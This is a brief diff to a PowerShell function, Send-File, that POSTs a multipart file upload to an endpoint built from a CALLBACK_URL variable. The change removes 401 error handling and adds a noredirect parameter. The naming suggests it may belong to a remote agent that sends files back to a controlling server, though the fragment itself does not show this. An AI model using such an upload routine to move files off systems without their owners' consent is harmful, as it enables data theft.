@@ -324,11 +324,7 @@ function Send-File {
         "--$boundary--$LF"
     ) -join $LF
 
-    try {
-        $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-    } catch [System.Net.WebException] {
-         if (-not $_.Exception.Message -match "401")  {throw $_}
-    }
+    $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
 }
 
 
